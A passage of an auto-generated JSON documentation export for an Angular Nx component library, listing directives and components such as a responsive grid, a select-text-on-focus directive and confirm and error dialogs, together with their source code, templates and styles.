        "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\r\n\r\ninterface BreakpointConfig {\r\n  2: number;\r\n  4: number;\r\n}\r\n\r\nconst getClass = (width: number, small = 400, large = 800) => {\r\n  let cols = 1;\r\n  if ( width > small ) {\r\n    cols += 1;\r\n  }\r\n  if ( width > large ) {\r\n    cols += 2;\r\n  }\r\n  return `sto-f-grid--${cols}`;\r\n};\r\n\r\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\r\n\r\n@Directive({ selector: '[stoGridSpacer]' })\r\nexport class StoGridSpacerDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  @HostBinding('class.sto-f-grid__col--spacer')\r\n  useClass = true;\r\n}\r\n\r\n@Directive({ selector: '[stoGridColumn]' })\r\nexport class StoGridColumnDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  useClass = true;\r\n  @HostBinding('class.sto-f-grid__col--2')\r\n  @Input()\r\n  stoGridColumnDouble: boolean;\r\n\r\n}\r\n\r\n@Directive({\r\n  selector: '[stoGrid]',\r\n  exportAs: 'stoGrid'\r\n})\r\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\r\n  @HostBinding('style.max-width.px')\r\n  @Input()\r\n  maxWidth = 1000;\r\n  @HostBinding('style.min-width.px')\r\n  @Input()\r\n  minWidth = 250;\r\n  @HostBinding('class.sto-f-grid')\r\n  baseClass = true;\r\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\r\n  columns: QueryList<ElementRef<HTMLElement>>;\r\n  @Input()\r\n  breakpoints: BreakpointConfig;\r\n\r\n  private observer: ResizeObserver;\r\n\r\n  constructor(\r\n    private elRef: ElementRef<HTMLElement>,\r\n  ) {\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    const el = this.elRef.nativeElement as HTMLElement;\r\n    this.observer = new ResizeObserver(entries => {\r\n      for ( const entry of entries ) {\r\n        const cr = entry.contentRect;\r\n        const { width } = cr;\r\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\r\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\r\n        if ( !el.classList.contains(gridType) ) {\r\n          el.classList.remove(...ALL_GRIDS);\r\n          el.classList.add(gridType);\r\n        }\r\n      }\r\n    });\r\n    this.observer.observe(this.elRef.nativeElement);\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    if ( this.observer ) {\r\n      this.observer.disconnect();\r\n    }\r\n  }\r\n\r\n}\r\n\r\n",
        "selector": "[stoGridSpacer]",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-f-grid__col",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 25,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "class.sto-f-grid__col--spacer",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 25,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "propertiesClass": [
          {
            "name": "useClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 25,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-f-grid__col'"
              },
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-f-grid__col--spacer'"
              }
            ]
          }
        ],
        "methodsClass": []
      },
      {
        "name": "StoSelectTextOnFocusDirective",
        "id": "directive-StoSelectTextOnFocusDirective-fce75d194b3ba985875451f52e47ef67dcc729b11b27b0769adbffb36f3858a84221cb80bfee492ba5e0433698d74a86d6b7e94eec2a70d805d7ee9dd627b32a",
        "file": "libs/core/src/lib/sto-directives/sto-select-text-on-focus.directive.ts",
        "type": "directive",
        "description": "<p>stoSelectTextOnFocus listens for input focus events, and selects the contents of the input\nA user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature</p>\n",
        "rawdescription": "\n\nstoSelectTextOnFocus listens for input focus events, and selects the contents of the input\nA user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature\n",
        "sourceCode": "import { Directive, ElementRef, HostListener, OnDestroy, OnInit, Optional } from '@angular/core';\r\nimport { Subject } from 'rxjs';\r\nimport { StoUserPreferenceService } from '../sto-user-preference/sto-user-preference.service';\r\nimport { takeUntil } from 'rxjs/operators';\r\n\r\n/**\r\n * stoSelectTextOnFocus listens for input focus events, and selects the contents of the input\r\n * A user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature\r\n */\r\n@Directive({\r\n  selector: '[stoSelectTextOnFocus]'\r\n})\r\nexport class StoSelectTextOnFocusDirective implements OnInit, OnDestroy {\r\n\r\n  private destroyed$ = new Subject<boolean>();\r\n\r\n  private _hasSelectTextOnFocusEnabled: boolean;\r\n  private _el: HTMLInputElement;\r\n\r\n  constructor(private elementRef: ElementRef, @Optional() private userPreferenceService: StoUserPreferenceService) {\r\n    this._el = this.elementRef.nativeElement;\r\n  }\r\n\r\n  /**\r\n   * Listens for focus events on the host (input) element, and focuses if applicable\r\n   */\r\n  @HostListener('focus')\r\n  @HostListener('dblclick')\r\n  onFocus() {\r\n    if ( this._hasSelectTextOnFocusEnabled && this._el.readOnly === false ) {\r\n      this._el.select();\r\n    }\r\n\r\n  }\r\n\r\n  /**\r\n   * Subscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.\r\n   */\r\n  ngOnInit() {\r\n    if ( this.userPreferenceService ) {\r\n      this.userPreferenceService.hasSelectTextOnFocusEnabled\r\n        .pipe(\r\n          takeUntil(this.destroyed$)\r\n        ).subscribe((hasSelectTextOnFocusEnabled) => {\r\n        this._hasSelectTextOnFocusEnabled = hasSelectTextOnFocusEnabled;\r\n      });\r\n    }\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n}\r\n",
        "selector": "[stoSelectTextOnFocus]",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "dblclick",
            "args": [],
            "argsDecorator": [],
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListens for focus events on the host (input) element, and focuses if applicable\n",
            "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
            "line": 29
          },
          {
            "name": "focus",
            "args": [],
            "argsDecorator": [],
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListens for focus events on the host (input) element, and focuses if applicable\n",
            "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
            "line": 29
          }
        ],
        "propertiesClass": [
          {
            "name": "_el",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "HTMLInputElement",
            "optional": false,
            "description": "",
            "line": 18,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "_hasSelectTextOnFocusEnabled",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": false,
            "description": "",
            "line": 17,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "destroyed$",
            "defaultValue": "new Subject<boolean>()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 15,
            "modifierKind": [
              121
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 50,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 39,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nSubscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.\n",
            "description": "<p>Subscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.</p>\n"
          },
          {
            "name": "onFocus",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 29,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListens for focus events on the host (input) element, and focuses if applicable\n",
            "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
            "decorators": [
              {
                "name": "HostListener",
                "stringifiedArguments": "'focus'"
              },
              {
                "name": "HostListener",
                "stringifiedArguments": "'dblclick'"
              }
            ]
          }
        ],
            "implements": [
                "OnInit",
                "OnDestroy"
            ],
            "constructorObj": {
              "name": "constructor",
              "description": "",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "elementRef",
                  "type": "ElementRef",
                  "deprecated": false,
                  "deprecationMessage": ""
                },
                {
                  "name": "userPreferenceService",
                  "type": "StoUserPreferenceService",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "line": 18,
              "jsdoctags": [
                {
                  "name": "elementRef",
                  "type": "ElementRef",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                },
                {
                  "name": "userPreferenceService",
                  "type": "StoUserPreferenceService",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "readme": "<h4 id=\"stoselecttextonfocusdirective\">StoSelectTextOnFocusDirective</h4>\n<p>stoSelectTextOnFocus listens for input focus events, and selects the contents of the input.\nA user service is established in that allows a user to toggle this feature</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;input matInput stoSelectTextOnFocus\n    [formControl]=&quot;freeTextControl&quot; placeholder=&quot;Free Text&quot;&gt;</code></pre></div>"
        }
    ],
    "components": [
      {
        "name": "AppComponent",
        "id": "component-AppComponent-75b3bc9c61c08fa268ddd712b1881e2fcc4c805337307dbaf0deb90ab071b311a53f8528b7c2bcc621619765dfce0ae50cc7f3096c2550607f7f69c5e4e39f81",
        "file": "apps/oilmod-web/src/app/app.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "oilmod-web-nx-root",
        "styleUrls": [
          "./app.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./app.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "title",
            "defaultValue": "'oilmod-web'",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 9
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'oilmod-web-nx-root',\r\n  templateUrl: './app.component.html',\r\n  styleUrls: ['./app.component.scss'],\r\n})\r\nexport class AppComponent {\r\n  title = 'oilmod-web';\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "/*\r\n * Remove template code below\r\n */\r\n:host {\r\n  display: block;\r\n  font-family: sans-serif;\r\n  min-width: 300px;\r\n  max-width: 600px;\r\n  margin: 50px auto;\r\n}\r\n\r\n.gutter-left {\r\n  margin-left: 9px;\r\n}\r\n\r\n.col-span-2 {\r\n  grid-column: span 2;\r\n}\r\n\r\n.flex {\r\n  display: flex;\r\n  align-items: center;\r\n  justify-content: center;\r\n}\r\n\r\nheader {\r\n  background-color: #143055;\r\n  color: white;\r\n  padding: 5px;\r\n  border-radius: 3px;\r\n}\r\n\r\nmain {\r\n  padding: 0 36px;\r\n}\r\n\r\np {\r\n  text-align: center;\r\n}\r\n\r\nh1 {\r\n  text-align: center;\r\n  margin-left: 18px;\r\n  font-size: 24px;\r\n}\r\n\r\nh2 {\r\n  text-align: center;\r\n  font-size: 20px;\r\n  margin: 40px 0 10px 0;\r\n}\r\n\r\n.resources {\r\n  text-align: center;\r\n  list-style: none;\r\n  padding: 0;\r\n  display: grid;\r\n  grid-gap: 9px;\r\n  grid-template-columns: 1fr 1fr;\r\n}\r\n\r\n.resource {\r\n  color: #0094ba;\r\n  height: 36px;\r\n  background-color: rgba(0, 0, 0, 0);\r\n  border: 1px solid rgba(0, 0, 0, 0.12);\r\n  border-radius: 4px;\r\n  padding: 3px 9px;\r\n  text-decoration: none;\r\n}\r\n\r\n.resource:hover {\r\n  background-color: rgba(68, 138, 255, 0.04);\r\n}\r\n\r\npre {\r\n  padding: 9px;\r\n  border-radius: 4px;\r\n  background-color: black;\r\n  color: #eee;\r\n}\r\n\r\ndetails {\r\n  border-radius: 4px;\r\n  color: #333;\r\n  background-color: rgba(0, 0, 0, 0);\r\n  border: 1px solid rgba(0, 0, 0, 0.12);\r\n  padding: 3px 9px;\r\n  margin-bottom: 9px;\r\n}\r\n\r\nsummary {\r\n  cursor: pointer;\r\n  outline: none;\r\n  height: 36px;\r\n  line-height: 36px;\r\n}\r\n\r\n.github-star-container {\r\n  margin-top: 12px;\r\n  line-height: 20px;\r\n}\r\n\r\n.github-star-container a {\r\n  display: flex;\r\n  align-items: center;\r\n  text-decoration: none;\r\n  color: #333;\r\n}\r\n\r\n.github-star-badge {\r\n  color: #24292e;\r\n  display: flex;\r\n  align-items: center;\r\n  font-size: 12px;\r\n  padding: 3px 10px;\r\n  border: 1px solid rgba(27, 31, 35, 0.2);\r\n  border-radius: 3px;\r\n  background-image: linear-gradient(-180deg, #fafbfc, #eff3f6 90%);\r\n  margin-left: 4px;\r\n  font-weight: 600;\r\n}\r\n\r\n.github-star-badge:hover {\r\n  background-image: linear-gradient(-180deg, #f0f3f6, #e6ebf1 90%);\r\n  border-color: rgba(27, 31, 35, 0.35);\r\n  background-position: -0.5em;\r\n}\r\n.github-star-badge .material-icons {\r\n  height: 16px;\r\n  width: 16px;\r\n  margin-right: 4px;\r\n}\r\n",
            "styleUrl": "./app.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<header class=\"flex\">\r\n  <img\r\n    alt=\"Nx logo\"\r\n    width=\"75\"\r\n    src=\"https://nx.dev/assets/images/nx-logo-white.svg\"\r\n  />\r\n  <h1>Welcome to {{ title }}!</h1>\r\n</header>\r\n<main>\r\n  <h2>Resources &amp; Tools</h2>\r\n  <p>Thank you for using and showing some ♥ for Nx.</p>\r\n  <div class=\"flex github-star-container\">\r\n    <a\r\n      href=\"https://github.com/nrwl/nx\"\r\n      target=\"_blank\"\r\n      rel=\"noopener noreferrer\"\r\n    >\r\n      If you like Nx, please give it a star:\r\n      <div class=\"github-star-badge\">\r\n        <svg\r\n          class=\"material-icons\"\r\n          xmlns=\"http://www.w3.org/2000/svg\"\r\n          width=\"24\"\r\n          height=\"24\"\r\n          viewBox=\"0 0 24 24\"\r\n        >\r\n          <path d=\"M0 0h24v24H0z\" fill=\"none\" />\r\n          <path\r\n            d=\"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z\"\r\n          />\r\n        </svg>\r\n        Star\r\n      </div>\r\n    </a>\r\n  </div>\r\n  <p>Here are some links to help you get started.</p>\r\n  <ul class=\"resources\">\r\n    <li class=\"col-span-2\">\r\n      <a class=\"resource flex\" href=\"https://nxplaybook.com/p/nx-workspaces\">\r\n        Nx video course\r\n      </a>\r\n    </li>\r\n    <li class=\"col-span-2\">\r\n      <a\r\n        class=\"resource flex\"\r\n        href=\"https://nx.dev/latest/angular/getting-started/getting-started\"\r\n      >\r\n        Nx video tutorial\r\n      </a>\r\n    </li>\r\n    <li class=\"col-span-2\">\r\n      <a\r\n        class=\"resource flex\"\r\n        href=\"https://nx.dev/latest/angular/tutorial/01-create-application\"\r\n      >\r\n        Interactive tutorial\r\n      </a>\r\n    </li>\r\n    <li class=\"col-span-2\">\r\n      <a class=\"resource flex\" href=\"https://nx.app/\">\r\n        <svg\r\n          width=\"36\"\r\n          height=\"36\"\r\n          viewBox=\"0 0 120 120\"\r\n          fill=\"none\"\r\n          xmlns=\"http://www.w3.org/2000/svg\"\r\n        >\r\n          <path\r\n            d=\"M120 15V30C103.44 30 90 43.44 90 60C90 76.56 76.56 90 60 90C43.44 90 30 103.44 30 120H15C6.72 120 0 113.28 0 105V15C0 6.72 6.72 0 15 0H105C113.28 0 120 6.72 120 15Z\"\r\n            fill=\"#0E2039\"\r\n          />\r\n          <path\r\n            d=\"M120 30V105C120 113.28 113.28 120 105 120H30C30 103.44 43.44 90 60 90C76.56 90 90 76.56 90 60C90 43.44 103.44 30 120 30Z\"\r\n            fill=\"white\"\r\n          />\r\n        </svg>\r\n        <span class=\"gutter-left\">Nx Cloud</span>\r\n      </a>\r\n    </li>\r\n  </ul>\r\n  <h2>Next Steps</h2>\r\n  <p>Here are some things you can do with Nx.</p>\r\n  <details open>\r\n    <summary>Add UI library</summary>\r\n    <pre>\r\n# Generate UI lib\r\nng g @nrwl/angular:lib ui\r\n\r\n# Add a component\r\nng g @nrwl/angular:component xyz --project ui</pre\r\n    >\r\n  </details>\r\n  <details>\r\n    <summary>View dependency graph</summary>\r\n    <pre>nx dep-graph</pre>\r\n  </details>\r\n  <details>\r\n    <summary>Run affected commands</summary>\r\n    <pre>\r\n# see what's been affected by changes\r\nng affected:dep-graph\r\n\r\n# run tests for current changes\r\nng affected:test\r\n\r\n# run e2e tests for current changes\r\nng affected:e2e\r\n</pre\r\n    >\r\n  </details>\r\n</main>\r\n"
      },
      {
        "name": "ConfirmComponent",
        "id": "component-ConfirmComponent-3c2054e7ddab340f52c97fbd431db8ebfc4636d996a0661c2a057218d96f799246dcb37032a0495ebf376630b07375353f27ccaa57c1cf3ee99073685a1ebb27",
        "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-confirm",
        "styleUrls": [
          "sto-confirm-dialog.component.scss"
        ],
        "styles": [],
        "template": "<h3 *ngIf=\"data.title\"\n    mat-dialog-title>{{ data.title }}</h3>\n<div mat-dialog-content>\n  <p>{{ data.message }}</p>\n</div>\n<div mat-dialog-actions>\n  <button #ok\n          color=\"primary\"\n          mat-flat-button\n          [mat-dialog-close]=\"true\">{{ data.confirmText }}</button>\n  <button #cancel\n          *ngIf=\"data.showCancel\"\n          title=\"Cancel (esc)\"\n          mat-button\n          [mat-dialog-close]=\"false\">Cancel\n  </button>\n</div>\n",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "data",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Data",
            "optional": false,
            "description": "",
            "line": 41,
            "decorators": [
              {
                "name": "Inject",
                "stringifiedArguments": "MAT_DIALOG_DATA"
              }
            ],
            "modifierKind": [
              123
            ]
          },
          {
            "name": "dialogRef",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MatDialogRef<ConfirmComponent>",
            "optional": false,
            "description": "",
            "line": 41,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "ok",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "ElementRef<HTMLButtonElement>",
            "optional": false,
            "description": "",
            "line": 39,
            "decorators": [
              {
                "name": "ViewChild",
                "stringifiedArguments": "'ok'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "<p>A confirm dialog that emits an observable.</p>\n",
        "rawdescription": "\n\nA confirm dialog that emits an observable.\n",
        "type": "component",
        "sourceCode": "import { Component, ElementRef, Inject, ViewChild } from '@angular/core';\r\nimport { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';\r\n\r\ntype Data = {\r\n  title: string;\r\n  message: string;\r\n  showCancel?: boolean;\r\n  confirmText: string;\r\n}\r\n\r\n/**\r\n * A confirm dialog that emits an observable.\r\n */\r\n@Component({\r\n  selector: 'sto-confirm',\r\n  template: `\r\n    <h3 *ngIf=\"data.title\"\r\n        mat-dialog-title>{{ data.title }}</h3>\r\n    <div mat-dialog-content>\r\n      <p>{{ data.message }}</p>\r\n    </div>\r\n    <div mat-dialog-actions>\r\n      <button #ok\r\n              color=\"primary\"\r\n              mat-flat-button\r\n              [mat-dialog-close]=\"true\">{{ data.confirmText }}</button>\r\n      <button #cancel\r\n              *ngIf=\"data.showCancel\"\r\n              title=\"Cancel (esc)\"\r\n              mat-button\r\n              [mat-dialog-close]=\"false\">Cancel\r\n      </button>\r\n    </div>\r\n  `,\r\n  styleUrls: ['sto-confirm-dialog.component.scss']\r\n})\r\nexport class ConfirmComponent {\r\n  @ViewChild('ok')\r\n  ok: ElementRef<HTMLButtonElement>;\r\n\r\n  constructor(@Inject(MAT_DIALOG_DATA) public data: Data, public dialogRef: MatDialogRef<ConfirmComponent>) {\r\n  }\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "",
            "styleUrl": "sto-confirm-dialog.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "data",
              "type": "Data",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "dialogRef",
              "type": "MatDialogRef<ConfirmComponent>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 39,
          "jsdoctags": [
            {
              "name": "data",
              "type": "Data",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "dialogRef",
              "type": "MatDialogRef<ConfirmComponent>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "readme": "<h4 id=\"stoconfirmdialog\">StoConfirmDialog</h4>\n<p> A confirm dialog that emits an observable.\n The ConfirmService is injected to a component and used from there.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">class MyComp {\n  constructor(private confirmService: ConfirmService) {}\n  // component logic\n}</code></pre></div><p>Here the ConfirmService is injected to a component through the constructor.</p>\n<p>#####confirm\nThe confirm method takes three arguments, the message in the dialog, a title and the text for the confirm or &quot;OK&quot; utton. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">this.confirmSvc.confirm(message, title, confirmText)\n     .subscribe(isConfirmed =&gt; {\n       if (isConfirmed) {\n           //Do stuff\n       }\n       else {\n         // Ignore\n       }\n     }); </code></pre></div>"
      },
      {
        "name": "ConfirmDemoComponent",
        "id": "component-ConfirmDemoComponent-78d80ddef6f2b936ff31947848334586bf1b936c1ea8620f277e511493ed12aa11520f547ca1c421e9ab357806583197fbdfcf1683d8e1d0b26bf8f7ffe55441",
        "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "app-confirm-demo",
        "styleUrls": [],
        "styles": [],
        "template": "<button (click)=\"show()\"\n        mat-button>Show confirm\n</button>\n",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [
          {
            "name": "show",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 19,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\r\nimport { moduleMetadata } from '@storybook/angular';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\r\n// @ts-ignore\r\nimport { Component, NgModule } from '@angular/core';\r\nimport { ConfirmModule, ConfirmService } from '@ngx-stoui/common';\r\n\r\n@Component({\r\n  selector: 'app-confirm-demo',\r\n  template: `\r\n    <button (click)=\"show()\"\r\n            mat-button>Show confirm\r\n    </button>\r\n  `,\r\n\r\n})\r\nclass ConfirmDemoComponent {\r\n  show() {\r\n    this.confirm.confirm('Confirmation message should be short', 'Confirm delete', 'Delete');\r\n  }\r\n\r\n  constructor(private confirm: ConfirmService) {\r\n  }\r\n}\r\n\r\n@NgModule({\r\n  declarations: [ConfirmDemoComponent],\r\n  exports: [ConfirmDemoComponent],\r\n})\r\nclass ConfirmerModule {}\r\n\r\nexport default {\r\n  title: 'common/Confirm Service',\r\n  decorators: [\r\n    moduleMetadata({\r\n      imports: [\r\n        ConfirmModule, ConfirmerModule, BrowserAnimationsModule, MatButtonModule ],\r\n      declarations: [  ],\r\n    })\r\n  ],\r\n  parameters: {\r\n  },\r\n} as Meta;\r\n\r\n\r\nexport const Usage: Story<ConfirmDemoComponent> = (args: ConfirmDemoComponent) => {\r\n  return {\r\n    component: ConfirmDemoComponent,\r\n    props: args,\r\n    template: '<app-confirm-demo></app-confirm-demo>'\r\n  };\r\n};\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "confirm",
              "type": "ConfirmService",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 21,
          "jsdoctags": [
            {
              "name": "confirm",
              "type": "ConfirmService",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      },
      {
        "name": "DialogComponent",
        "id": "component-DialogComponent-eb6bb561473523c9eba567f42d49f9f2c00a1342c0661b986178b33351eee325c1da29fe6d5207370477c1788a0a8f895f9e3e436bd33f0965b1af38d6eb982f",
        "file": "libs/error-handler/src/lib/error-handler/dialog/dialog.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-dialog",
        "styleUrls": [
          "./dialog.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./dialog.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "data",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "HttpError",
            "optional": false,
            "description": "",
            "line": 12,
            "decorators": [
              {
                "name": "Inject",
                "stringifiedArguments": "MAT_DIALOG_DATA"
              }
            ],
            "modifierKind": [
              123
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "handleEvent",
            "args": [
              {
                "name": "action",
                "type": " |  | undefined",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 16,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "action",
                "type": " |  | undefined",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, Inject } from '@angular/core';\r\nimport { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';\r\nimport { HttpError } from '../http-error';\r\n\r\n@Component({\r\n  selector: 'sto-dialog',\r\n  templateUrl: './dialog.component.html',\r\n  styleUrls: [ './dialog.component.scss' ]\r\n})\r\nexport class DialogComponent {\r\n\r\n  constructor(@Inject(MAT_DIALOG_DATA) public data: HttpError, private ref: MatDialogRef<DialogComponent>) {\r\n  }\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n  handleEvent(action: ((...args: any[]) => unknown) | unknown | undefined) {\r\n    if ( typeof action === 'function' ) {\r\n      try {\r\n        action(this.data);\r\n      } catch ( ex ) {\r\n        console.warn('Failed to execute function.');\r\n        console.warn(ex);\r\n      }\r\n    }\r\n    this.ref.close(action || this.data);\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "",
            "styleUrl": "./dialog.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "data",
              "type": "HttpError",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "ref",
              "type": "MatDialogRef<DialogComponent>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 10,
          "jsdoctags": [
            {
              "name": "data",
              "type": "HttpError",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "ref",
              "type": "MatDialogRef<DialogComponent>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "templateData": "<h3 style=\"font-weight: 500\"\r\n    mat-dialog-title>\r\n  {{ data.title }}\r\n</h3>\r\n<mat-dialog-content>\r\n  <p style=\"font-size: 16px; white-space: pre-line\">{{ data.text }}</p>\r\n</mat-dialog-content>\r\n<mat-dialog-actions style=\"justify-content: flex-end\">\r\n  <button color=\"primary\"\r\n          mat-button\r\n          *ngIf=\"!(data.actions || []).length\"\r\n          mat-dialog-close>OK\r\n  </button>\r\n  <button color=\"primary\"\r\n          mat-button\r\n          *ngFor=\"let a of data.actions\"\r\n          (click)=\"handleEvent(a.action || a.closeDialogData)\">\r\n    {{ a.label }}\r\n  </button>\r\n</mat-dialog-actions>\r\n"
      },
      {
        "name": "DialogDemoComponent",
